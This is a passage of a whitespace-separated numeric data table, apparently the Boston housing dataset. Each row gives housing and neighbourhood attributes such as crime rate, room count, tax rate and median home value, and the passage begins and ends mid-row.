 19.10 385.02  14.81  21.40\n 0.38735   0.00  25.650  0  0.5810  5.6130  95.60  1.7572   2  188.0  19.10 359.29  27.26  15.70\n 0.25915   0.00  21.890  0  0.6240  5.6930  96.00  1.7883   4  437.0  21.20 392.11  17.19  16.20\n 0.32543   0.00  21.890  0  0.6240  6.4310  98.80  1.8125   4  437.0  21.20 396.90  15.39  18.00\n 0.88125   0.00  21.890  0  0.6240  5.6370  94.70  1.9799   4  437.0  21.20 396.90  18.34  14.30\n 0.34006   0.00  21.890  0  0.6240  6.4580  98.90  2.1185   4  437.0  21.20 395.04  12.60  19.20\n 1.19294   0.00  21.890  0  0.6240  6.3260  97.70  2.2710   4  437.0  21.20 396.90  12.26  19.60\n 0.59005   0.00  21.890  0  0.6240  6.3720  97.90  2.3274   4  437.0  21.20 385.76  11.12  23.00\n 0.32982   0.00  21.890  0  0.6240  5.8220  95.40  2.4699   4  437.0  21.20 388.69  15.03  18.40\n 0.97617   0.00  21.890  0  0.6240  5.7570  98.40  2.3460   4  437.0  21.20 262.76  17.31  15.60\n 0.55778   0.00  21.890  0  0.6240  6.3350  98.20  2.1107   4  437.0  21.20 394.67  16.96  18.10\n 0.32264   0.00  21.890  0  0.6240  5.9420  93.50  1.9669   4  437.0  21.20 378.25  16.90  17.40\n 0.35233   0.00  21.890  0  0.6240  6.4540  98.40  1.8498   4  437.0  21.20 394.08  14.59  17.10\n 0.24980   0.00  21.890  0  0.6240  5.8570  98.20  1.6686   4  437.0  21.20 392.04  21.32  13.30\n 0.54452   0.00  21.890  0  0.6240  6.1510  97.90  1.6687   4  437.0  21.20 396.90  18.46  17.80\n 0.29090   0.00  21.890  0  0.6240  6.1740  93.60  1.6119   4  437.0  21.20 388.08  24.16  14.00\n 1.62864   0.00  21.890  0  0.6240  5.0190 100.00  1.4394   4  437.0  21.20 396.90  34.41  14.40\n 3.32105   0.00  19.580  1  0.8710  5.4030 100.00  1.3216   5  403.0  14.70 396.90  26.82  13.40\n 4.09740   0.00  19.580  0  0.8710  5.4680 100.00  1.4118   5  403.0  14.70 396.90  26.42  15.60\n 2.77974   0.00  19.580  0  0.8710  4.9030  97.80  1.3459   5  403.0  14.70 396.90  29.29  11.80\n 2.37934   0.00  19.580  0  0.8710  6.1300 100.00  1.4191   5  403.0  14.70 172.91  27.80  13.80\n 2.15505   0.00  19.580  0  0.8710  5.6280 100.00  1.5166   5  403.0  14.70 169.27  16.65  15.60\n 2.36862   0.00  19.580  0  0.8710  4.9260  95.70  1.4608   5  403.0  14.70 391.71  29.53  14.60\n 2.33099   0.00  19.580  0  0.8710  5.1860  93.80  1.5296   5  403.0  14.70 356.99  28.32  17.80\n 2.73397   0.00  19.580  0  0.8710  5.5970  94.90  1.5257   5  403.0  14.70 351.85  21.45  15.40\n 1.65660   0.00  19.580  0  0.8710  6.1220  97.30  1.6180   5  403.0  14.70 372.80  14.10  21.50\n 1.49632   0.00  19.580  0  0.8710  5.4040 100.00  1.5916   5  403.0  14.70 341.60  13.28  19.60\n 1.12658   0.00  19.580  1  0.8710  5.0120  88.00  1.6102   5  403.0  14.70 343.28  12.12  15.30\n 2.14918   0.00  19.580  0  0.8710  5.7090  98.50  1.6232   5  403.0  14.70 261.95  15.79  19.40\n 1.41385   0.00  19.580  1  0.8710  6.1290  96.00  1.7494   5  403.0  14.70 321.02  15.12  17.00\n 3.53501   0.00  19.580  1  0.8710  6.1520  82.60  1.7455   5  403.0  14.70  88.01  15.02  15.60\n 2.44668   0.00  19.580  0  0.8710  5.2720  94.00  1.7364   5  403.0  14.70  88.63  16.14  13.10\n 1.22358   0.00  19.580  0  0.6050  6.9430  97.40  1.8773   5  403.0  14.70 363.43   4.59  41.30\n 1.34284   0.00  19.580  0  0.6050  6.0660 100.00  1.7573   5  403.0  14.70 353.89   6.43  24.30\n 1.42502   0.00  19.580  0  0.8710  6.5100 100.00  1.7659   5  403.0  14.70 364.31   7.39  23.30\n 1.27346   0.00  19.580  1  0.6050  6.2500  92.60  1.7984   5  403.0  14.70 338.92   5.50  27.00\n 1.46336   0.00  19.580  0  0.6050  7.4890  90.80  1.9709   5  403.0  14.70 374.43   1.73  50.00\n 1.83377   0.00  19.580  1  0.6050  7.8020  98.20  2.0407   5  403.0  14.70 389.61   1.92  50.00\n 1.51902   0.00  19.580  1  0.6050  8.3750  93.90  2.1620   5  403.0  14.70 388.45   3.32  50.00\n 2.24236   0.00  19.580  0  0.6050  5.8540  91.80  2.4220   5  403.0  14.70 395.11  11.64  22.70\n 2.92400   0.00  19.580  0  0.6050  6.1010  93.00  2.2834   5  403.0  14.70 240.16   9.81  25.00\n 2.01019   0.00  19.580  0  0.6050  7.9290  96.20  2.0459   5  403.0  14.70 369.30   3.70  50.00\n 1.80028   0.00  19.580  0  0.6050  5.8770  79.20  2.4259   5  403.0  14.70 227.61  12.14  23.80\n 2.30040   0.00  19.580  0  0.6050  6.3190  96.10  2.1000   5  403.0  14.70 297.09  11.10  23.80\n 2.44953   0.00  19.580  0  0.6050  6.4020  95.20  2.2625   5  403.0  14.70 330.04  11.32  22.30\n 1.20742   0.00  19.580  0  0.6050  5.8750  94.60  2.4259   5  403.0  14.70 292.29  14.43  17.40\n 2.31390   0.00  19.580  0  0.6050  5.8800  97.30  2.3887   5  403.0  14.70 348.13  12.03  19.10\n 0.13914   0.00   4.050  0  0.5100  5.5720  88.50  2.5961   5  296.0  16.60 396.90  14.69  23.10\n 0.09178   0.00   4.050  0  0.5100  6.4160  84.10  2.6463   5  296.0  16.60 395.50   9.04  23.60\n 0.08447   0.00   4.050  0  0.5100  5.8590  68.70  2.7019   5  296.0  16.60 393.23   9.64  22.60\n 0.06664   0.00   4.050  0  0.5100  6.5460  33.10  3.1323   5  296.0  16.60 390.96   5.33  29.40\n 0.07022   0.00   4.050  0  0.5100  6.0200  47.20  3.5549   5  296.0  16.60 393.23  10.11  23.20\n 0.05425   0.00   4.050  0  0.5100  6.3150  73.40  3.3175   5  296.0  16.60 395.60   6.29  24.60\n 0.06642   0.00   4.050  0  0.5100  6.8600  74.40  2.9153   5  296.0  16.60 391.27   6.92  29.90\n 0.05780   0.00   2.460  0  0.4880  6.9800  58.40  2.8290   3  193.0  17.80 396.90   5.04  37.20\n 0.06588   0.00   2.460  0  0.4880  7.7650  83.30  2.7410   3  193.0  17.80 395.56   7.56  39.80\n 0.06888   0.00   2.460  0  0.4880  6.1440  62.20  2.5979   3  193.0  17.80 396.90   9.45  36.20\n 0.09103   0.00   2.460  0  0.4880  7.1550  92.20  2.7006   3  193.0  17.80 394.12   4.82  37.90\n 0.10008   0.00   2.460  0  0.4880  6.5630  95.60  2.8470   3  193.0  17.80 396.90   5.68  32.50\n 0.08308   0.00   2.460  0  0.4880  5.6040  89.80  2.9879   3  193.0  17.80 391.00  13.98  26.40\n 0.06047   0.00   2.460  0  0.4880  6.1530  68.80  3.2797   3  193.0  17.80 387.11  13.15  29.60\n 0.05602   0.00   2.460  0  0.4880  7.8310  53.60  3.1992   3  193.0  17.80 392.63   4.45  50.00\n 0.07875  45.00   3.440  0  0.4370  6.7820  41.10  3.7886   5  398.0  15.20 393.87   6.68  32.00\n 0.12579  45.00   3.440  0  0.4370  6.5560  29.10  4.5667   5  398.0  15.20 382.84   4.56  29.80\n 0.08370  45.00   3.440  0  0.4370  7.1850  38.90  4.5667   5  398.0  15.20 396.90   5.39  34.90\n 0.09068  45.00   3.440  0  0.4370  6.9510  21.50  6.4798   5  398.0  15.20 377.68   5.10  37.00\n 0.06911  45.00   3.440  0  0.4370  6.7390  30.80  6.4798   5  398.0  15.20 389.71   4.69  30.50\n 0.08664  45.00   3.440  0  0.4370  7.1780  26.30  6.4798   5  398.0  15.20 390.49   2.87  36.40\n 0.02187  60.00   2.930  0  0.4010  6.8000   9.90  6.2196   1  265.0  15.60 393.37   5.03  31.10\n 0.01439  60.00   2.930  0  0.4010  6.6040  18.80  6.2196   1  265.0  15.60 376.70   4.38  29.10\n 0.01381  80.00   0.460  0  0.4220  7.8750  32.00  5.6484   4  255.0  14.40 394.23   2.97  50.00\n 0.04011  80.00   1.520  0  0.4040  7.2870  34.10  7.3090   2  329.0  12.60 396.90   4.08  33.30\n 0.04666  80.00   1.520  0  0.4040  7.1070  36.60  7.3090   2  329.0  12.60 354.31   8.61  30.30\n 0.03768  80.00   1.520  0  0.4040  7.2740  38.30  7.3090   2  329.0  12.60 392.20   6.62  34.60\n 0.03150  95.00   1.470  0  0.4030  6.9750  15.30  7.6534   3  402.0  17.00 396.90   4.56  34.90\n 0.01778  95.00   1.470  0  0.4030  7.1350  13.90  7.6534   3  402.0  17.00 384.30   4.45  32.90\n 0.03445  82.50   2.030  0  0.4150  6.1620  38.40  6.2700   2  348.0  14.70 393.77   7.43  24.10\n 0.02177  82.50   2.030  0  0.4150  7.6100  15.70  6.2700   2  348.0  14.70 395.38   3.11  42.30\n 0.03510  95.00   2.680  0  0.4161  7.8530  33.20  5.1180   4  224.0  14.70 392.78   3.81  48.50\n 0.02009  95.00   2.680  0  0.4161  8.0340  31.90  5.1180   4  224.0  14.70 390.55   2.88  50.00\n 0.13642   0.00  10.590  0  0.4890  5.8910  22.30  3.9454   4  277.0  18.60 396.90  10.87  22.60\n 0.22969   0.00  10.590  0  0.4890  6.3260  52.50  4.3549   4  277.0  18.60 394.87  10.97  24.40\n 0.25199   0.00  10.590  0  0.4890  5.7830  72.70  4.3549   4  277.0  18.60 389.43  18.06  22.50\n 0.13587   0.00  10.590  1  0.4890  6.0640  59.10  4.2392   4  277.0  18.60 381.32  14.66  24.40\n 0.43571   0.00  10.590  1  0.4890  5.3440 100.00  3.8750   4  277.0  18.60 396.90  23.09  20.00\n 0.17446   0.00  10.590  1  0.4890  5.9600  92.10  3.8771   4  277.0  18.60 393.25  17.27  21.70\n 0.37578   0.00  10.590  1  0.4890  5.4040  88.60  3.6650   4  277.0  18.60 395.24  23.98  19.30\n 0.21719   0.00  10.590  1  0.4890  5.8070  53.80  3.6526   4  277.0  18.60 390.94  16.03  22.40\n 0.14052   0.00  10.590  0  0.4890  6.3750  32.30  3.9454   4  277.0  18.60 385.81   9.38  28.10\n 0.28955   0.00  10.590  0  0.4890  5.4120   9.80  3.5875   4  277.0  18.60 348.93  29.55  23.70\n 0.19802   0.00  10.590  0  0.4890  6.1820  42.40  3.9454   4  277.0  18.60 393.63   9.47  25.00\n 0.04560   0.00  13.890  1  0.5500  5.8880  56.00  3.1121   5  276.0  16.40 392.80  13.51  23.30\n 0.07013   0.00  13.890  0  0.5500  6.6420  85.10  3.4211   5  276.0  16.40 392.78   9.69  28.70\n 0.11069   0.00  13.890  1  0.5500  5.9510  93.80  2.8893   5  276.0  16.40 396.90  17.92  21.50\n 0.11425   0.00  13.890  1  0.5500  6.3730  92.40  3.3633   5  276.0  16.40 393.74  10.50  23.00\n 0.35809   0.00   6.200  1  0.5070  6.9510  88.50  2.8617   8  307.0  17.40 391.70   9.71  26.70\n 0.40771   0.00   6.200  1  0.5070  6.1640  91.30  3.0480   8  307.0  17.40 395.24  21.46  21.70\n 0.62356   0.00   6.200  1  0.5070  6.8790  77.70  3.2721   8  307.0  17.40 390.39   9.93  27.50\n 0.61470   0.00   6.200  0  0.5070  6.6180  80.80  3.2721   8  307.0  17.40 396.90   7.60  30.10\n 0.31533   0.00   6.200  0  0.5040  8.2660  78.30  2.8944   8  307.0  17.40 385.05   4.14  44.80\n 0.52693   0.00   6.200  0  0.5040  8.7250  83.00  2.8944   8  307.0  17.40 382.00   4.63  50.00\n 0.38214   0.00   6.200  0  0.5040  8.0400  86.50  3.2157   8  307.0  17.40 387.38   3.13  37.60\n 0.41238   0.00   6.200  0  0.5040  7.1630  79.90  3.2157   8  307.0  17.40 372.08   6.36  31.60\n 0.29819   0.00   6.200  0  0.5040  7.6860  17.00  3.3751   8  307.0  17.40 377.51   3.92  46.70\n 0.44178   0.00   6.200  0  0.5040  6.5520  21.40  3.3751   8  307.0  17.40 380.34   3.76  31.50\n 0.53700   0.00   6.200  0  0.5040  5.9810  68.10  3.6715   8  307.0  17.40 378.35  11.65  24.30\n 0.46296   0.00   6.200  0  0.5040  7.4120  76.90  3.6715   8  307.0  17.40 376.14   5.25  31.70\n 0.57529   0.00   6.200  0  0.5070  8.3370  73.30  3.8384   8  307.0  17.40 385.91   2.47  41.70\n 0.33147   0.00   6.200  0  0.5070  8.2470  70.40  3.6519   8  307.0  17.40 378.95   3.95  48.30\n 0.44791   0.00   6.200  1  0.5070  6.7260  66.50  3.6519   8  307.0  17.40 360.20   8.05  29.00\n 0.33045   0.00   6.200  0  0.5070  6.0860  61.50  3.6519   8  307.0  17.40 376.75  10.88  24.00\n 0.52058   0.00   6.200  1  0.5070  6.6310  76.50  4.1480   8  307.0  17.40 388.45   9.54  25.10\n 0.51183   0.00   6.200  0  0.5070  7.3580  71.60  4.1480   8  307.0  17.40 390.07   4.73  31.50\n 0.08244  30.00   4.930  0  0.4280  6.4810  18.50  6.1899   6  300.0  16.60 379.41   6.36  23.70\n 0.09252  30.00   4.930  0  0.4280  6.6060  42.20  6.1899   6  300.0  16.60 383.78   7.37  23.30\n 0.11329  30.00   4.930  0  0.4280  6.8970  54.30  6.3361   6  300.0  16.60 391.25  11.38  22.00\n 0.10612  30.00   4.930  0  0.4280  6.0950  65.10  6.3361   6  300.0  16.60 394.62  12.40  20.10\n 0.10290  30.00   4.930  0  0.4280  6.3580  52.90  7.0355   6  300.0  16.60 372.75  11.22  22.20\n 0.12757  30.00   4.930  0  0.4280  6.3930   7.80  7.0355   6  300.0  16.60 374.71   5.19  23.70\n 0.20608  22.00   5.860  0  0.4310  5.5930  76.50  7.9549   7  330.0  19.10 372.49  12.50  17.60\n 0.19133  22.00   5.860  0  0.4310  5.6050  70.20  7.9549   7  330.0  19.10 389.13  18.46  18.50\n 0.33983  22.00   5.860  0  0.4310  6.1080  34.90  8.0555   7  330.0  19.10 390.18   9.16  24.30\n 0.19657  22.00   5.860  0  0.4310  6.2260  79.20  8.0555   7  330.0  19.10 376.14  10.15  20.50\n 0.16439  22.00   5.860  0  0.4310  6.4330  49.10  7.8265   7  330.0  19.10 374.71   9.52  24.50\n 0.19073  22.00   5.860  0  0.4310  6.7180  17.50  7.8265   7  330.0  19.10 393.74   6.56  26.20\n 0.14030  22.00   5.860  0  0.4310  6.4870  13.00  7.3967   7  330.0  19.10 396.28   5.90  24.40\n 0.21409  22.00   5.860  0  0.4310  6.4380   8.90  7.3967   7  330.0  19.10 377.07   3.59  24.80\n 0.08221  22.00   5.860  0  0.4310  6.9570   6.80  8.9067   7  330.0  19.10 386.09   3.53  29.60\n 0.36894  22.00   5.860  0  0.4310  8.2590   8.40  8.9067   7  330.0  19.10 396.90   3.54  42.80\n 0.04819  80.00   3.640  0  0.3920  6.1080  32.00  9.2203   1  315.0  16.40 392.89   6.57  21.90\n 0.03548  80.00   3.640  0  0.3920  5.8760  19.10  9.2203   1  315.0  16.40 395.18   9.25  20.90\n 0.01538  90.00   3.750  0  0.3940  7.4540  34.20  6.3361   3  244.0  15.90 386.34   3.11  44.00\n 0.61154  20.00   3.970  0  0.6470  8.7040  86.90  1.8010   5  264.0  13.00 389.70   5.12  50.00\n 0.66351  20.00   3.970  0  0.6470  7.3330 100.00  1.8946   5  264.0  13.00 383.29   7.79  36.00\n 0.65665  20.00   3.970  0  0.6470  6.8420 100.00  2.0107   5  264.0  13.00 391.93   6.90  30.10\n 0.54011  20.00   3.970  0  0.6470  7.2030  81.80  2.1121   5  264.0  13.00 392.80   9.59  33.80\n 0.53412  20.00   3.970  0  0.6470  7.5200  89.40  2.1398   5  264.0  13.00 388.37   7.26  43.10\n 0.52014  20.00   3.970  0  0.6470  8.3980  91.50  2.2885   5  264.0  13.00 386.86   5.91  48.80\n 0.82526  20.00   3.970  0  0.6470  7.3270  94.50  2.0788   5  264.0  13.00 393.42  11.25  31.00\n 0.55007  20.00   3.970  0  0.6470  7.2060  91.60  1.9301   5  264.0  13.00 387.89   8.10  36.50\n 0.76162  20.00   3.970  0  0.6470  5.5600  62.80  1.9865   5  264.0  13.00 392.40  10.45  22.80\n 0.78570  20.00   3.970  0  0.6470  7.0140  84.60  2.1329   5  264.0  13.00 384.07  14.79  30.70\n 0.57834  20.00   3.970  0  0.5750  8.2970  67.00  2.4216   5  264.0  13.00 384.54   7.44  50.00\n 0.54050  20.00   3.970  0  0.5750  7.4700  52.60  2.8720   5  264.0  13.00 390.30   3.16  43.50\n 0.09065  20.00   6.960  1  0.4640  5.9200  61.50  3.9175   3  223.0  18.60 391.34  13.65  20.70\n 0.29916  20.00   6.960  0  0.4640  5.8560  42.10  4.4290   3  223.0  18.60 388.65  13.00  21.10\n 0.16211  20.00   6.960  0  0.4640  6.2400  16.30  4.4290   3  223.0  18.60 396.90   6.59  25.20\n 0.11460  20.00   6.960  0  0.4640  6.5380  58.70  3.9175   3  223.0  18.60 394.96   7.73  24.40\n 0.22188  20.00   6.960  1  0.4640  7.6910  51.80  4.3665   3  223.0  18.60 390.77   6.58  35.20\n 0.05644  40.00   6.410  1  0.4470  6.7580  32.90  4.0776   4  254.0  17.60 396.90   3.53  32.40\n 0.09604  40.00   6.410  0  0.4470  6.8540  42.80  4.2673   4  254.0  17.60 396.90   2.98  32.00\n 0.10469  40.00   6.410  1  0.4470  7.2670  49.00  4.7872   4  254.0  17.60 389.25   6.05  33.20\n 0.06127  40.00   6.410  1  0.4470  6.8260  27.60  4.8628   4  254.0  17.60 393.45   4.16  33.10\n 0.07978  40.00   6.410  0  0.4470  6.4820  32.10  4.1403   4  254.0  17.60 396.90   7.19  29.10\n 0.21038  20.00   3.330  0  0.4429  6.8120  32.20  4.1007   5  216.0  14.90 396.90   4.85  35.10\n 0.03578  20.00   3.330  0  0.4429  7.8200  64.50  4.6947   5  216.0  14.90 387.31   3.76  45.40\n 0.03705  20.00   3.330  0  0.4429  6.9680  37.20  5.2447   5  216.0  14.90 392.23   4.59  35.40\n 0.06129  20.00   3.330  1  0.4429  7.6450  49.70  5.2119   5  216.0  14.90 377.07   3.01  46.00\n 0.01501  90.00   1.210  1  0.4010  7.9230  24.80  5.8850   1  198.0  13.60 395.52   3.16  50.00\n 0.00906  90.00   2.970  0  0.4000  7.0880  20.80  7.3073   1  285.0  15.30 394.72   7.85  32.20\n 0.01096  55.00   2.250  0  0.3890  6.4530  31.90  7.3073   1  300.0  15.30 394.72   8.23  22.00\n 0.01965  80.00   1.760  0  0.3850  6.2300  31.50  9.0892   1  241.0  18.20 341.60  12.93  20.10\n 0.03871  52.50   5.320  0  0.4050  6.2090  31.30  7.3172   6  293.0  16.60 396.90   7.14  23.20\n 0.04590  52.50   5.320  0  0.4050  6.3150  45.60  7.3172   6  293.0  16.60 396.90   7.60  22.30\n 0.04297  52.50   5.320  0  0.4050  6.5650  22.90  7.3172   6  293.0  16.60 371.72   9.51  24.80\n 0.03502  80.00   4.950  0  0.4110  6.8610  27.90  5.1167   4  245.0  19.20 396.90   3.33  28.50\n 0.07886  80.00   4.950  0  0.4110  7.1480  27.70  5.1167   4  245.0  19.20 396.90   3.56  37.30\n 0.03615  80.00   4.950  0  0.4110  6.6300  23.40  5.1167   4  245.0  19.20 396.90   4.70  27.90\n 0.08265   0.00  13.920  0  0.4370  6.1270  18.40  5.5027   4  289.0  16.00 396.90   8.58  23.90\n 0.08199   0.00  13.920  0  0.4370  6.0090  42.30  5.5027   4  289.0  16.00 396.90  10.40  21.70\n 0.12932   0.00  13.920  0  0.4370  6.6780  31.10  5.9604   4  289.0  16.00 396.90   6.27  28.60\n 0.05372   0.00  13.920  0  0.4370  6.5490  51.00  5.9604   4  289.0  16.00 392.85   7.39  27.10\n 0.14103   0.00  13.920  0  0.4370  5.7900  58.00  6.3200   4  289.0  16.00 396.90  15.84  20.30\n 0.06466  70.00   2.240  0  0.4000  6.3450  20.10  7.8278   5  358.0  14.80 368.24   4.97  22.50\n 0.05561  70.00   2.240  0  0.4000  7.0410  10.00  7.8278   5  358.0  14.80 371.58   4.74  29.00\n 0.04417  70.00   2.240  0  0.4000  6.8710  47.40  7.8278   5  358.0  14.80 390.86   6.07  24.80\n 0.03537  34.00   6.090  0  0.4330  6.5900  40.40  5.4917   7  329.0  16.10 395.75   9.50  22.00\n 0.09266  34.00   6.090  0  0.4330  6.4950  18.40  5.4917   7  329.0  16.10 383.61   8.67  26.40\n 0.10000  34.00   6.090  0  0.4330  6.9820  17.70  5.4917   7  329.0  16.10 390.43   4.86  33.10\n 0.05515  33.00   2.180  0  0.4720  7.2360  41.10  4.0220   7  222.0  18.40 393.68   6.93  36.10\n 0.05479  33.00   2.180  0  0.4720  6.6160  58.10  3.3700   7  222.0  18.40 393.36   8.93  28.40\n 0.07503  33.00   2.180  0  0.4720  7.4200  71.90  3.0992   7  222.0  18.40 396.90   6.47  33.40\n 0.04932  33.00   2.180  0  0.4720  6.8490  70.30  3.1827   7  222.0  18.40 396.90   7.53  28.20\n 0.49298   0.00   9.900  0  0.5440  6.6350  82.50  3.3175   4  304.0  18.40 396.90   4.54  22.80\n 0.34940   0.00   9.900  0  0.5440  5.9720  76.70  3.1025   4  304.0  18.40 396.24   9.97  20.30\n 2.63548   0.00   9.900  0  0.5440  4.9730  37.80  2.5194   4  304.0  18.40 350.45  12.64  16.10\n 0.79041   0.00   9.900  0  0.5440  6.1220  52.80  2.6403   4  304.0  18.40 396.90   5.98  22.10\n 0.26169   0.00   9.900  0  0.5440  6.0230  90.40  2.8340   4  304.0  18.40 396.30  11.72  19.40\n 0.26938   0.00   9.900  0  0.5440  6.2660  82.80  3.2628   4  304.0  18.40 393.39   7.90  21.60\n 0.36920   0.00   9.900  0  0.5440  6.5670  87.30  3.6023   4  304.0  18.40 395.69   9.28  23.80\n 0.25356   0.00   9.900  0  0.5440  5.7050  77.70  3.9450   4  304.0  18.40 396.42  11.50  16.20\n 0.31827   0.00   9.900  0  0.5440  5.9140  83.20  3.9986   4  304.0  18.40 390.70  18.33  17.80\n 0.24522   0.00   9.900  0  0.5440  5.7820  71.70  4.0317   4  304.0  18.40 396.90  15.94  19.80\n 0.40202   0.00   9.900  0  0.5440  6.3820  67.20  3.5325   4  304.0  18.40 395.21  10.36  23.10\n 0.47547   0.00   9.900  0  0.5440  6.1130  58.80  4.0019   4  304.0  18.40 396.23  12.73  21.00\n 0.16760   0.00   7.380  0  0.4930  6.4260  52.30  4.5404   5  287.0  19.60 396.90   7.20  23.80\n 0.18159   0.00   7.380  0  0.4930  6.3760  54.30  4.5404   5  287.0  19.60 396.90   6.87  23.10\n 0.35114   0.00   7.380  0  0.4930  6.0410  49.90  4.7211   5  287.0  19.60 396.90   7.70  20.40\n 0.28392   0.00   7.380  0  0.4930  5.7080  74.30  4.7211   5  287.0  19.60 391.13  11.74  18.50\n 0.34109   0.00   7.380  0  0.4930  6.4150  40.10  4.7211   5  287.0  19.60 396.90   6.12  25.00\n 0.19186   0.00   7.380  0  0.4930  6.4310  14.70  5.4159   5  287.0  19.60 393.68   5.08  24.60\n 0.30347   0.00   7.380  0  0.4930  6.3120  28.90  5.4159   5  287.0  19.60 396.90   6.15  23.00\n 0.24103   0.00   7.380  0  0.4930  6.0830  43.70  5.4159   5  287.0  19.60 396.90  12.79  22.20\n 0.06617   0.00   3.240  0  0.4600  5.8680  25.80  5.2146   4  430.0  16.90 382.44   9.97  19.30\n 0.06724   0.00   3.240  0  0.4600  6.3330  17.20  5.2146   4  430.0  16.90 375.21   7.34  22.60\n 0.04544   0.00   3.240  0  0.4600  6.1440  32.20  5.8736   4  430.0  16.90 368.57   9.09  19.80\n 0.05023  35.00   6.060  0  0.4379  5.7060  28.40  6.6407   1  304.0  16.90 394.02  12.43  17.10\n 0.03466  35.00   6.060  0  0.4379  6.0310  23.30  6.6407   1  304.0  16.90 362.25   7.83  19.40\n 0.05083   0.00   5.190  0  0.5150  6.3160  38.10  6.4584   5  224.0  20.20 389.71   5.68  22.20\n 0.03738   0.00   5.190  0  0.5150  6.3100  38.50  6.4584   5  224.0  20.20 389.40   6.75  20.70\n 0.03961   0.00   5.190  0  0.5150  6.0370  34.50  5.9853   5  224.0  20.20 396.90   8.01  21.10\n 0.03427   0.00   5.190  0  0.5150  5.8690  46.30  5.2311   5  224.0  20.20 396.90   9.80  19.50\n 0.03041   0.00   5.190  0  0.5150  5.8950  59.60  5.6150   5  224.0  20.20 394.81  10.56  18.50\n 0.03306   0.00   5.190  0  0.5150  6.0590  37.30  4.8122   5  224.0  20.20 396.14   8.51  20.60\n 0.05497   0.00   5.190  0  0.5150  5.9850  45.40  4.8122   5  224.0  20.20 396.90   9.74  19.00\n 0.06151   0.00   5.190  0  0.5150  5.9680  58.50  4.8122   5  224.0  20.20 396.90   9.29  18.70\n 0.01301  35.00   1.520  0  0.4420  7.2410  49.30  7.0379   1  284.0  15.50 394.74   5.49  32.70\n 0.02498   0.00   1.890  0  0.5180  6.5400  59.70  6.2669   1  422.0  15.90 389.96   8.65  16.50\n 0.02543  55.00   3.780  0  0.4840  6.6960  56.40  5.7321   5  370.0  17.60 396.90   7.18  23.90\n 0.03049  55.00   3.780  0  0.4840  6.8740  28.10  6.4654   5  370.0  17.60 387.97   4.61  31.20\n 0.03113   0.00   4.390  0  0.4420  6.0140  48.50  8.0136   3  352.0  18.80 385.64  10.53  17.50\n 0.06162   0.00   4.390  0  0.4420  5.8980  52.30  8.0136   3  352.0  18.80 364.61  12.67  17.20\n 0.01870  85.00   4.150  0  0.4290  6.5160  27.70  8.5353   4  351.0  17.90 392.43   6.36  23.10\n 0.01501  80.00   2.010  0  0.4350  6.6350  29.70  8.3440   4  280.0  17.00 390.94   5.99  24.50\n 0.02899  40.00   1.250  0  0.4290  6.9390  34.50  8.7921   1  335.0  19.70 389.85   5.89  26.60\n 0.06211  40.00   1.250  0  0.4290  6.4900  44.40  8.7921   1  335.0  19.70 396.90   5.98  22.90\n 0.07950  60.00   1.690  0  0.4110  6.5790  35.90 10.7103   4  411.0  18.30 370.78   5.49  24.10\n 0.07244  60.00   1.690  0  0.4110  5.8840  18.50 10.7103   4  411.0  18.30 392.33   7.79  18.60\n 0.01709  90.00   2.020  0  0.4100  6.7280  36.10 12.1265   5  187.0  17.00 384.46   4.50  30.10\n 0.04301  80.00   1.910  0  0.4130  5.6630  21.90 10.5857   4  334.0  22.00 382.80   8.05  18.20\n 0.10659  80.00   1.910  0  0.4130  5.9360  19.50 10.5857   4  334.0  22.00 376.04   5.57  20.60\n 8.98296   0.00  18.100  1  0.7700  6.2120  97.40  2.1222  24  666.0  20.20 377.73  17.60  17.80\n 3.84970   0.00  18.100  1  0.7700  6.3950  91.00  2.5052  24  666.0  20.20 391.34  13.27  21.70\n 5.20177   0.00  18.100  1  0.7700  6.1270  83.40  2.7227  24  666.0  20.20 395.43  11.48  22.70\n 4.26131   0.00  18.100  0  0.7700  6.1120  81.30  2.5091  24  666.0  20.20 390.74  12.67  22.60\n 4.54192   0.00  18.100  0  0.7700  6.3980  88.00  2.5182  24  666.0  20.20 374.56   7.79  25.00\n 3.83684   0.00  18.100  0  0.7700  6.2510  91.10  2.2955  24  666.0  20.20 350.65  14.19  19.90\n 3.67822   0.00  18.100  0  0.7700  5.3620  96.20  2.1036  24  666.0  20.20 380.79  10.19  20.80\n 4.22239   0.00  18.100  1  0.7700  5.8030  89.00  1.9047  24  666.0  20.20 353.04  14.64  16.80\n 3.47428   0.00  18.100  1  0.7180  8.7800  82.90  1.9047  24  666.0  20.20 354.55   5.29  21.90\n 4.55587   0.00  18.100  0  0.7180  3.5610  87.90  1.6132  24  666.0  20.20 354.70   7.12  27.50\n 3.69695   0.00  18.100  0  0.7180  4.9630  91.40  1.7523  24  666.0  20.20 316.03  14.00  21.90\n13.52220   0.00  18.100  0  0.6310  3.8630 100.00  1.5106  24  666.0  20.20 131.42  13.33  23.10\n 4.89822   0.00  18.100  0  0.6310  4.9700 100.00  1.3325  24  666.0  20.20 375.52   3.26  50.00\n 5.66998   0.00  18.100  1  0.6310  6.6830  96.80  1.3567  24  666.0  20.20 375.33   3.73  50.00\n 6.53876   0.00  18.100  1  0.6310  7.0160  97.50  1.2024  24  666.0  20.20 392.05   2.96  50.00\n 9.23230   0.00  18.100  0  0.6310  6.2160 100.00  1.1691  24  666.0  20.20 366.15   9.53  50.00\n 8.26725   0.00  18.100  1  0.6680  5.8750  89.60  1.1296  24  666.0  20.20 347.88   8.88  50.00\n11.10810   0.00  18.100  0  0.6680  4.9060 100.00  1.1742  24  666.0  20.20 396.90  34.77  13.80\n18.49820   0.00  18.100  0  0.6680  4.1380 100.00  1.1370  24  666.0  20.20 396.90  37.97  13.80\n19.60910   0.00  18.100  0  0.6710  7.3130  97.90  1.3163  24  666.0  20.20 396.90  13.44  15.00\n15.28800   0.00  18.100  0  0.6710  6.6490  93.30  1.3449  24  666.0  20.20 363.02  23.24  13.90\n 9.82349   0.00  18.100  0  0.6710  6.7940  98.80  1.3580  24  666.0  20.20 396.90  21.24  13.30\n23.64820   0.00  18.100  0  0.6710  6.3800  96.20  1.3861  24  666.0  20.20 396.90  23.69  13.10\n17.86670   0.00  18.100  0  0.6710  6.2230 100.00  1.3861  24  666.0  20.20 393.74  21.78  10.20\n88.97620   0.00  18.100  0  0.6710  6.9680  91.90  1.4165  24  666.0  20.20 396.90  17.21  10.40\n15.87440   0.00  18.100  0  0.6710  6.5450  99.10  1.5192  24  666.0  20.20 396.90  21.08  10.90\n 9.18702   0.00  18.100  0  0.7000  5.5360 100.00  1.5804  24  666.0  20.20 396.90  23.60  11.30\n 7.99248   0.00  18.100  0  0.7000  5.5200 100.00  1.5331  24  666.0  20.20 396.90  24.56  12.30\n20.08490   0.00  18.100  0  0.7000  4.3680  